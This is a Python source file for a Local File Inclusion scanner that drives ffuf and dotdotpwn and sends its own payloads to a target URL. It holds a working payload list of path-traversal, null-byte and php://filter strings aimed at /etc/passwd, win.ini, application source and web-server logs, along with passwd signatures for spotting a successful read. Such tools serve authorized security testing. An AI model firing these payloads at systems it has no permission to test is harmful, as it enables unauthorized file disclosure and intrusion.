#!/usr/bin/env python3
"""
LFI Detection Orchestrator
Academic Security Research Tool

This orchestrator generates execution plans for Local File Inclusion (LFI) detection,
coordinates tool execution, and produces structured JSON output.
"""

import json
import subprocess
import asyncio
import time
import re
import sys
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging

from config import Config
from logging_utils import configure_logger
from tooling import resolve_tool_path


@dataclass
class ExecutionPlan:
    """Represents an execution plan for LFI detection"""

    tool: str
    command: List[str]
    timeout: int
    priority: int
    description: str
    params: Dict[str, Any] = None


@dataclass
class LFIFinding:
    """Represents a single LFI vulnerability finding"""

    parameter: str
    payload: str
    url: str
    evidence: str
    severity: str
    confidence: str
    tool: str
    response_indicators: List[str]


@dataclass
class ToolResult:
    """Represents the result from a single tool execution"""

    tool: str
    success: bool
    findings: List[LFIFinding]
    execution_time: float
    parameters_tested: int
    payloads_tested: int
    error: Optional[str] = None
    raw_output: Optional[str] = None


class LFIOrchestrator:
    """
    Orchestrates LFI detection across multiple tools and techniques.
    Generates execution plans, coordinates tool execution, and formats results.
    """

    def __init__(self, config: Config):
        self.config = config
        self.logger = self._setup_logging()

        # LFI detection signatures
        self.linux_signatures = [
            "root:x:",
            "daemon:x:",
            "/bin/bash",
            "/bin/sh",
            "nobody:x:",
        ]
        self.windows_signatures = [
            "[boot loader]",
            "[operating systems]",
            "[extensions]",
            "c:\\windows",
            "c:\\winnt",
        ]
        self.generic_signatures = [
            "<?php",
            "<?xml",
        ]

    def _get_lfi_tools_config(self) -> Dict[str, Dict[str, Any]]:
        """Return normalized LFI tool configuration with legacy fallback."""
        if hasattr(self.config, "get_lfi_tools"):
            return self.config.get_lfi_tools()

        lfi_tools = getattr(self.config, "lfi_tools", None)
        if isinstance(lfi_tools, dict) and lfi_tools:
            return lfi_tools

        legacy_lfi_tools = getattr(self.config, "tools", {}).get("lfi_tools", {})
        return legacy_lfi_tools if isinstance(legacy_lfi_tools, dict) else {}

    def _setup_logging(self) -> logging.Logger:
        """Configure logging for the orchestrator"""
        return configure_logger("LFIOrchestrator")

    def _extract_parameters(self, url: str) -> List[str]:
        """Extract vulnerable parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())

    def generate_execution_plan(
        self, target_url: str, parameters: Optional[List[str]] = None
    ) -> List[ExecutionPlan]:
        """
        Generate execution plans for all configured LFI detection tools.

        Args:
            target_url: The target URL to test
            parameters: Optional list of parameters to test (auto-detected if None)

        Returns:
            List of ExecutionPlan objects sorted by priority
        """
        plans = []

        # Auto-detect parameters if not provided
        if not parameters:
            parameters = self._extract_parameters(target_url)

        if not parameters:
            self.logger.warning("No parameters found in URL for testing")
            return plans

        self.logger.info(
            f"Generating LFI detection plans for {len(parameters)} parameters"
        )

        lfi_tools = self._get_lfi_tools_config()

        # FFUF - Fast LFI fuzzing with custom wordlist
        if lfi_tools.get("ffuf", {}).get("enabled", True):
            wordlist = (
                lfi_tools.get("ffuf", {}).get("wordlist", "wordlists/lfi_payloads.txt")
            )
            wordlist_path = Path(wordlist)
            if not wordlist_path.is_absolute():
                wordlist_path = Path(__file__).parent / wordlist

            if wordlist_path.exists():
                for param in parameters:
                    # Build FFUF command for LFI detection
                    # Replace parameter value with FUZZ keyword
                    parsed = urlparse(target_url)
                    params = parse_qs(parsed.query)
                    params[param] = ["FUZZ"]
                    new_query = urlencode(params, doseq=True)
                    fuzz_url = urlunparse(
                        (
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            new_query,
                            parsed.fragment,
                        )
                    )

                    plans.append(
                        ExecutionPlan(
                            tool="ffuf",
                            command=[
                                "ffuf",
                                "-w",
                                str(wordlist_path),
                                "-u",
                                fuzz_url,
                                "-mc",
                                "200,500",
                                "-fs",
                                "0",
                                "-t",
                                "40",
                                "-json",
                                "-noninteractive",
                                "-ic",
                                "-H",
                                "User-Agent: Mozilla/5.0 LFI-Scanner Academic Research",
                            ],
                            timeout=300,
                            priority=1,
                            description=f"FFUF LFI fuzzing on parameter: {param}",
                            params={"parameter": param, "url": target_url},
                        )
                    )
            else:
                self.logger.warning(f"FFUF wordlist not found: {wordlist_path}")

        # DotDotPwn - Automated traversal directory detection
        if (
            lfi_tools.get("dotdotpwn", {}).get("enabled", False)
            and lfi_tools.get("dotdotpwn", {}).get("installed", False)
        ):
            for param in parameters:
                parsed = urlparse(target_url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                plans.append(
                    ExecutionPlan(
                        tool="dotdotpwn",
                        command=[
                            "perl",
                            resolve_tool_path("dotdotpwn"),
                            "-m",
                            "http-url",
                            "-h",
                            parsed.netloc,
                            "-x",
                            str(parsed.port) if parsed.port else "80",
                            "-f",
                            "/etc/passwd",
                            "-k",
                            "root:",
                            "-d",
                            "5",
                            "-t",
                            "150",
                            "-o",
                            "unix",
                        ],
                        timeout=600,
                        priority=2,
                        description=f"DotDotPwn traversal detection on parameter: {param}",
                        params={"parameter": param, "url": target_url},
                    )
                )

        # Custom payload testing
        if (
            lfi_tools.get("custom", {}).get("enabled", True)
        ):
            plans.append(
                ExecutionPlan(
                    tool="custom_lfi",
                    command=[],  # Custom internal testing
                    timeout=180,
                    priority=3,
                    description="Custom LFI payload testing",
                    params={"parameters": parameters, "url": target_url},
                )
            )

        # Sort by priority
        plans.sort(key=lambda x: x.priority)

        self.logger.info(
            f"Generated {len(plans)} execution plans for LFI detection on {target_url}"
        )
        for plan in plans:
            self.logger.info(f"  [{plan.priority}] {plan.tool}: {plan.description}")

        return plans

    def _run_subprocess_sync(self, command, timeout):
        """Run subprocess synchronously (Windows compatible)"""
        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=(
                    subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                ),
            )
            return result
        except subprocess.TimeoutExpired:
            return None
        except Exception as e:
            raise e

    async def _test_custom_payloads(
        self, url: str, parameters: List[str], timeout: int
    ) -> ToolResult:
        """Execute custom LFI payload testing"""
        import httpx

        start_time = time.time()
        findings = []

        # Common LFI payloads for testing
        payloads = [
            # Linux paths
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            # URL encoding
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            # Null byte injection (legacy PHP)
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            # Windows paths
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            # Log poisoning paths
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../var/log/apache2/error.log",
        ]

        import httpx
        httpx_kwargs = {"timeout": 30.0}
        if httpx.__version__ >= "0.20.0":
            httpx_kwargs["follow_redirects"] = True
        else:
            httpx_kwargs["allow_redirects"] = True
            
        async with httpx.AsyncClient(**httpx_kwargs) as client:
            for param in parameters:
                self.logger.info(
                    f"Testing parameter '{param}' with {len(payloads)} payloads"
                )

                for payload in payloads:
                    try:
                        # Build URL with payload
                        parsed = urlparse(url)
                        params_dict = parse_qs(parsed.query)
                        params_dict[param] = [payload]
                        new_query = urlencode(params_dict, doseq=True)
                        test_url = urlunparse(
                            (
                                parsed.scheme,
                                parsed.netloc,
                                parsed.path,
                                parsed.params,
                                new_query,
                                parsed.fragment,
                            )
                        )

                        # Send request
                        response = await client.get(
                            test_url,
                            headers={
                                "User-Agent": "Mozilla/5.0 LFI-Scanner Academic Research"
                            },
                        )

                        # Analyze response for LFI indicators
                        indicators = self._detect_lfi_in_response(
                            response.text, response.status_code
                        )

                        if indicators:
                            severity, confidence = self._assess_severity(
                                indicators, payload
                            )
                            finding = LFIFinding(
                                parameter=param,
                                payload=payload,
                                url=test_url,
                                evidence=response.text[:500],  # First 500 chars
                                severity=severity,
                                confidence=confidence,
                                tool="custom_lfi",
                                response_indicators=indicators,
                            )
                            findings.append(finding)
                            self.logger.info(
                                f"LFI detected: param={param}, payload={payload}, indicators={len(indicators)}"
                            )

                    except Exception as e:
                        self.logger.debug(f"Error testing payload {payload}: {str(e)}")
                        continue

        execution_time = time.time() - start_time

        return ToolResult(
            tool="custom_lfi",
            success=True,
            findings=findings,
            execution_time=execution_time,
            parameters_tested=len(parameters),
            payloads_tested=len(payloads) * len(parameters),
            error=None,
        )

    def _detect_lfi_in_response(self, content: str, status_code: int) -> List[str]:
        """Detect LFI indicators in HTTP response"""
        indicators = []

        # Check for Linux file signatures
        for sig in self.linux_signatures:
            if sig.lower() in content.lower():
                indicators.append(f"linux_file:{sig}")

        # Check for Windows file signatures
        for sig in self.windows_signatures:
            if sig.lower() in content.lower():
                indicators.append(f"windows_file:{sig}")

        # Check for source code disclosure
        for sig in self.generic_signatures:
            if sig in content:
                indicators.append(f"source_disclosure:{sig}")

        # Check for PHP wrapper responses
        if "base64" in content and len(content) % 4 == 0:
            # Possible base64 encoded content
            indicators.append("php_wrapper:base64_content")

        return indicators

    def _assess_severity(self, indicators: List[str], payload: str) -> Tuple[str, str]:
        """Assess severity and confidence of finding"""
        severity = "Medium"
        confidence = "Medium"

        # High severity: system file disclosure
        if any("linux_file:root:" in i for i in indicators):
            severity = "High"
            confidence = "High"
        elif any("windows_file:" in i for i in indicators):
            severity = "High"
            confidence = "High"

        # Medium severity: source code disclosure
        elif any("source_disclosure:" in i for i in indicators):
            severity = "Medium"
            confidence = "High"

        # Lower confidence for encoded content
        if any("base64" in i for i in indicators):
            confidence = "Medium"

        # Higher confidence for simple payloads
        if payload.count("..") <= 3:
            if confidence == "High":
                confidence = "High"
        else:
            if confidence == "High":
                confidence = "Medium"

        return severity, confidence

    async def execute_tool(self, plan: ExecutionPlan) -> ToolResult:
        """
        Execute a single tool according to its execution plan.

        Args:
            plan: ExecutionPlan to execute

        Returns:
            ToolResult containing the execution results
        """
        self.logger.info(f"Executing {plan.tool}...")
        start_time = time.time()

        try:
            # Custom LFI testing
            if plan.tool == "custom_lfi":
                return await self._test_custom_payloads(
                    plan.params["url"], plan.params["parameters"], plan.timeout
                )

            # Check if tool exists
            import shutil

            tool_executable = plan.command[0]
            if not shutil.which(tool_executable):
                execution_time = time.time() - start_time
                self.logger.warning(f"{plan.tool} not found - tool not installed")
                return ToolResult(
                    tool=plan.tool,
                    success=False,
                    findings=[],
                    execution_time=execution_time,
                    parameters_tested=0,
                    payloads_tested=0,
                    error=f"Tool not installed: {tool_executable}",
                )

            # Execute the command with subprocess.run via asyncio.to_thread (Windows compatible)
            self.logger.info(f"Running command: {' '.join(plan.command)}")
            result = await asyncio.to_thread(
                self._run_subprocess_sync, plan.command, plan.timeout
            )

            if result is None:
                execution_time = time.time() - start_time
                self.logger.warning(f"{plan.tool} timed out after {plan.timeout}s")
                return ToolResult(
                    tool=plan.tool,
                    success=False,
                    findings=[],
                    execution_time=execution_time,
                    parameters_tested=0,
                    payloads_tested=0,
                    error=f"Timeout after {plan.timeout} seconds",
                )

            execution_time = time.time() - start_time

            # Parse output
            raw_output = result.stdout or ""
            stderr_output = result.stderr or ""

            findings, params_tested, payloads_tested = self._parse_tool_output(
                plan.tool, raw_output, stderr_output, plan.params
            )

            success = len(findings) > 0 or result.returncode == 0

            self.logger.info(
                f"{plan.tool} completed in {execution_time:.2f}s - Found {len(findings)} potential LFI vulnerabilities"
            )

            return ToolResult(
                tool=plan.tool,
                success=success,
                findings=findings,
                execution_time=execution_time,
                parameters_tested=params_tested,
                payloads_tested=payloads_tested,
                error=stderr_output if not success and stderr_output else None,
                raw_output=raw_output if self.config.save_raw_output else None,
            )

        except Exception as e:
            execution_time = time.time() - start_time
            self.logger.error(f"Error executing {plan.tool}: {str(e)}")
            return ToolResult(
                tool=plan.tool,
                success=False,
                findings=[],
                execution_time=execution_time,
                parameters_tested=0,
                payloads_tested=0,
                error=str(e),
            )

    def _parse_tool_output(
        self, tool: str, output: str, stderr: str, params: Dict[str, Any]
    ) -> Tuple[List[LFIFinding], int, int]:
        """
        Parse tool output to extract LFI findings.

        Args:
            tool: Name of the tool
            output: Raw stdout from the tool
            stderr: Raw stderr from the tool
            params: Execution plan parameters

        Returns:
            Tuple of (findings list, parameters tested, payloads tested)
        """
        findings = []
        params_tested = 0
        payloads_tested = 0

        if tool == "ffuf":
            # FFUF with -json flag outputs NDJSON
            param_name = params.get("parameter", "unknown")
            params_tested = 1

            for line in output.strip().split("\n"):
                line = line.strip()
                if not line or not line.startswith("{"):
                    continue

                try:
                    data = json.loads(line)
                    payloads_tested += 1

                    # Extract result details
                    url = data.get("url", "")
                    status = data.get("status", 0)
                    length = data.get("length", 0)
                    words = data.get("words", 0)
                    payload = data.get("input", {}).get("FUZZ", "")

                    # Check if response indicates potential LFI
                    # We can't see content from FFUF, so we look for anomalies
                    # Status 200 with significant length could indicate file disclosure
                    if status == 200 and length > 100:
                        finding = LFIFinding(
                            parameter=param_name,
                            payload=payload,
                            url=url,
                            evidence=f"HTTP {status}, Length: {length}, Words: {words}",
                            severity="Medium",
                            confidence="Low",
                            tool="ffuf",
                            response_indicators=[
                                f"status:{status}",
                                f"length:{length}",
                            ],
                        )
                        findings.append(finding)

                except json.JSONDecodeError:
                    pass

        elif tool == "dotdotpwn":
            # DotDotPwn text output
            param_name = params.get("parameter", "unknown")
            params_tested = 1

            # Parse DotDotPwn output for vulnerabilities
            if "VULNERABLE" in output.upper() or "FOUND" in output.upper():
                # Extract the successful traversal pattern
                lines = output.split("\n")
                for line in lines:
                    if "VULNERABLE" in line.upper() or "FOUND" in line.upper():
                        finding = LFIFinding(
                            parameter=param_name,
                            payload="directory_traversal",
                            url=params.get("url", ""),
                            evidence=line.strip()[:200],
                            severity="High",
                            confidence="High",
                            tool="dotdotpwn",
                            response_indicators=["dotdotpwn_detection"],
                        )
                        findings.append(finding)
                        payloads_tested += 1

        return findings, params_tested, payloads_tested

    async def execute_all(self, plans: List[ExecutionPlan]) -> List[ToolResult]:
        """
        Execute all plans sequentially (LFI testing should be careful and not overwhelm target).

        Args:
            plans: List of ExecutionPlans to execute

        Returns:
            List of ToolResults
        """
        self.logger.info("Executing LFI detection tools sequentially...")
        results = []
        for plan in plans:
            result = await self.execute_tool(plan)
            results.append(result)
            # Small delay between tools to avoid overwhelming target
            await asyncio.sleep(1)

        return results

    def orchestrate(
        self, target_url: str, parameters: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Main orchestration method - generates plan, executes, analyzes, and formats results.

        Args:
            target_url: The target URL to test for LFI
            parameters: Optional list of parameters to test

        Returns:
            Structured JSON dictionary ready for dashboard
        """
        self.logger.info(f"Starting LFI detection for: {target_url}")
        start_time = time.time()

        # Validate URL
        parsed = urlparse(target_url)
        if not parsed.scheme or not parsed.netloc:
            return self._error_response("Invalid URL format")

        # Generate execution plans
        plans = self.generate_execution_plan(target_url, parameters)

        if not plans:
            return self._error_response(
                "No execution plans generated - check URL parameters and tool configuration"
            )

        # Execute all tools
        results = asyncio.run(self.execute_all(plans))

        # Aggregate findings
        all_findings = []
        total_params_tested = 0
        total_payloads_tested = 0

        for result in results:
            all_findings.extend(result.findings)
            total_params_tested = max(total_params_tested, result.parameters_tested)
            total_payloads_tested += result.payloads_tested

        # Format results
        total_time = time.time() - start_time
        formatted = self._format_output(
            target_url=target_url,
            tool_results=results,
            all_findings=all_findings,
            execution_time=total_time,
            parameters_tested=total_params_tested,
            payloads_tested=total_payloads_tested,
        )

        # Save results if configured
        if self.config.save_results:
            self._save_results(target_url, formatted)

        self.logger.info(f"LFI detection complete in {total_time:.2f}s")
        self.logger.info(f"Total findings: {len(all_findings)}")

        return formatted

    def _format_output(
        self,
        target_url: str,
        tool_results: List[ToolResult],
        all_findings: List[LFIFinding],
        execution_time: float,
        parameters_tested: int,
        payloads_tested: int,
    ) -> Dict[str, Any]:
        """Format results for dashboard output"""

        # Group findings by severity
        findings_by_severity = {"High": [], "Medium": [], "Low": []}
        for finding in all_findings:
            findings_by_severity[finding.severity].append(asdict(finding))

        # Tool summary
        tool_summary = []
        for result in tool_results:
            tool_summary.append(
                {
                    "tool": result.tool,
                    "success": result.success,
                    "findings_count": len(result.findings),
                    "execution_time": round(result.execution_time, 2),
                    "error": result.error,
                }
            )

        return {
            "success": True,
            "scan_type": "lfi_detection",
            "target_url": target_url,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "execution_time": round(execution_time, 2),
            "summary": {
                "total_findings": len(all_findings),
                "high_severity": len(findings_by_severity["High"]),
                "medium_severity": len(findings_by_severity["Medium"]),
                "low_severity": len(findings_by_severity["Low"]),
                "parameters_tested": parameters_tested,
                "payloads_tested": payloads_tested,
                "tools_executed": len(tool_results),
            },
            "findings": findings_by_severity,
            "tool_results": tool_summary,
            "raw_findings": [asdict(f) for f in all_findings],
        }

    def _error_response(self, message: str) -> Dict[str, Any]:
        """Generate standardized error response"""
        return {
            "success": False,
            "scan_type": "lfi_detection",
            "error": message,
            "timestamp": datetime.utcnow().isoformat(),
            "findings": None,
        }

    def _save_results(self, target_url: str, results: Dict[str, Any]):
        """Save results to file"""
        output_dir = self.config.get_results_dir("lfi", base_path=Path(__file__).parent)
        output_dir.mkdir(parents=True, exist_ok=True)

        # Sanitize URL for filename
        parsed = urlparse(target_url)
        domain = parsed.netloc.replace(":", "_").replace(".", "_")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"lfi_{domain}_{timestamp}.json"
        filepath = output_dir / filename

        results["output_file"] = str(filepath)
        with open(filepath, "w") as f:
            json.dump(results, f, indent=2)

        self.logger.info(f"Results saved to: {filepath}")


def main():
    """Main entry point for the LFI orchestrator"""
    import sys

    # Load configuration
    config = Config.load("config.json")

    # Get target URL
    if len(sys.argv) < 2:
        print("Usage: python lfi_scanner.py <target_url> [param1,param2,...]")
        print(
            "Example: python lfi_scanner.py http://example.com/page.php?file=index.php"
        )
        print(
            "Example: python lfi_scanner.py http://example.com/page.php?file=test page"
        )
        sys.exit(1)

    target_url = sys.argv[1]
    parameters = None
    if len(sys.argv) > 2:
        parameters = sys.argv[2].split(",")

    # Create orchestrator and run
    orchestrator = LFIOrchestrator(config)
    results = orchestrator.orchestrate(target_url, parameters)

    # Output JSON
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
